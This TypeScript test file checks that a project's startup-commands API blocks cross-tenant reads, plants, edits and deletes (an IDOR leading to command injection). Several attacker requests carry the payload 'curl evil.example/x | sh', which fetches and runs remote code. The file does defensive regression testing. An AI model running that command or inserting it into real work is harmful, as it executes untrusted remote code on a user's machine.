/**
 * Integration tests for startup-commands IDOR (security CR-6).
 *
 * Before the fix, GET/POST/PUT/DELETE on `/api/projects/:id/commands` had
 * no ownership check, so a logged-in user could read/plant/edit/delete
 * commands on ANY project. Because the `command` field is shell-exec'd by
 * the runner's command-runner, this was effectively command-injection.
 */
import { mock } from 'bun:test';

import * as realGit from '@funny/core/git';

// bun shares the mock.module registry across the whole test run, so anything we
// override here leaks into sibling test files. Spread the REAL module and only
// stub the git-repo existence checks (project creation in this suite uses direct
// DB seeding, not real repos) — keeping the real path validators so we don't
// silently neuter HI-3 path-containment assertions in other files.
mock.module('@funny/core/git', () => ({
  ...realGit,
  isGitRepoSync: () => true,
  isGitRepoRootSync: () => true,
  ensureWeaveConfigured: () => Promise.resolve(),
}));

import { beforeAll, beforeEach, describe, expect, test } from 'bun:test';

import { createTestApp, type TestApp } from '../helpers/test-app.js';
import { seedProject } from '../helpers/test-db.js';

describe('Startup commands IDOR (security CR-6)', () => {
  let t: TestApp;

  beforeAll(async () => {
    t = await createTestApp();
  });

  beforeEach(() => {
    t.cleanup();
    // Two users, each with their own project.
    seedProject(t.db as any, {
      id: 'p-alice',
      name: 'Alice Project',
      userId: 'alice',
      path: '/tmp/alice',
    });
    seedProject(t.db as any, {
      id: 'p-bob',
      name: 'Bob Project',
      userId: 'bob',
      path: '/tmp/bob',
    });
  });

  test('GET /api/projects/:id/commands — cross-tenant returns 404', async () => {
    const res = await t.requestAs('bob').get('/api/projects/p-alice/commands');
    expect(res.status).toBe(404);
  });

  test('POST /api/projects/:id/commands — cross-tenant returns 404 and does NOT plant', async () => {
    const evil = await t.requestAs('bob').post('/api/projects/p-alice/commands', {
      label: 'pwn',
      command: 'curl evil.example/x | sh',
    });
    expect(evil.status).toBe(404);

    // Verify nothing was planted: the owner's own list is empty.
    const aliceList = await t.requestAs('alice').get('/api/projects/p-alice/commands');
    expect(aliceList.status).toBe(200);
    expect(await aliceList.json()).toEqual([]);
  });

  test('POST — owner can plant their own command', async () => {
    const res = await t.requestAs('alice').post('/api/projects/p-alice/commands', {
      label: 'dev',
      command: 'npm run dev',
    });
    expect(res.status).toBe(201);
  });

  test("PUT — cross-tenant cannot modify another user's command", async () => {
    // Alice plants a command.
    const created = await t.requestAs('alice').post('/api/projects/p-alice/commands', {
      label: 'dev',
      command: 'npm run dev',
    });
    const planted = await created.json();

    // Bob tries to overwrite via the OWNER's project id.
    const bobOwn = await t.requestAs('bob').put(`/api/projects/p-alice/commands/${planted.id}`, {
      label: 'dev',
      command: 'curl evil.example/x | sh',
    });
    expect(bobOwn.status).toBe(404);

    // Bob also tries via his own project id (the cmd id belongs to Alice's).
    // The repo-level WHERE on projectId means the update silently no-ops
    // even if route-level ownership passes (defense in depth).
    const bobViaOwn = await t.requestAs('bob').put(`/api/projects/p-bob/commands/${planted.id}`, {
      label: 'dev',
      command: 'curl evil.example/x | sh',
    });
    // Project ownership passes (Bob owns p-bob), so route returns 200 — but
    // the repo's WHERE eq(projectId='p-bob') means zero rows actually
    // matched. Verify Alice's row is intact.
    expect([200, 404]).toContain(bobViaOwn.status);
    const aliceList = await t.requestAs('alice').get('/api/projects/p-alice/commands');
    const cmds = (await aliceList.json()) as Array<{ id: string; command: string }>;
    expect(cmds.find((c) => c.id === planted.id)?.command).toBe('npm run dev');
  });

  test("DELETE — cross-tenant cannot delete another user's command", async () => {
    const created = await t.requestAs('alice').post('/api/projects/p-alice/commands', {
      label: 'dev',
      command: 'npm run dev',
    });
    const planted = await created.json();

    const res = await t.requestAs('bob').delete(`/api/projects/p-alice/commands/${planted.id}`);
    expect(res.status).toBe(404);

    // Row still exists.
    const aliceList = await t.requestAs('alice').get('/api/projects/p-alice/commands');
    const cmds = (await aliceList.json()) as unknown[];
    expect(cmds).toHaveLength(1);
  });
});
